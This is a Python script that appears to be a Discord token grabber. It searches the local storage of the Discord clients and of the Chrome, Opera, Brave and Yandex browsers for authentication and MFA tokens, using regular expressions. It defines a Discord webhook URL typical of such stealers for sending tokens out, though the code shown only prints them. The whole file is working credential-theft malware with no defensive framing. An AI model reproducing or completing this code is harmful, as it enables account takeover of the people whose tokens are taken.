import os
import re

WEBHOOK_URL = 'https://discord.com/api/webhooks/1129209643474882570/kg3kosSWvwrYGs5qMXuGno59lch3-4r8KU5boapbfEeqWWN_Xoepb4UZMaKn7Swb6Vft'

def get_tokens(path):
    tokens = []
    print(f"Checking path: {path}")
    for root, dirs, files in os.walk(path):
        for file_name in files:
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            print(f"Reading file: {file_name}")
            file_path = os.path.join(root, file_name)
            with open(file_path, errors='ignore') as file:
                for line in [x.strip() for x in file.readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            tokens.append(token)
    return tokens

def main():
    paths = {
        'Discord': os.getenv('APPDATA') + '\\Discord',
        'Discord Canary': os.getenv('APPDATA') + '\\discordcanary',
        'Discord PTB': os.getenv('APPDATA') + '\\discordptb',
        'Google Chrome': os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default',
        'Opera': os.getenv('APPDATA') + '\\Opera Software\\Opera Stable',
        'Brave': os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': os.getenv('LOCALAPPDATA') + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    all_tokens = []
    for platform, path in paths.items():
        if not os.path.exists(path):
            print(f"Path does not exist: {path}")
            continue
        tokens = get_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                all_tokens.append(token)
                print(f"{platform}: {token}")
        else:
            print(f"No tokens found in {platform} path: {path}")

    if len(all_tokens) > 0:
        print(f"Found tokens: {all_tokens}")
    else:
        print("No tokens found.")

if __name__ == "__main__":
    main()
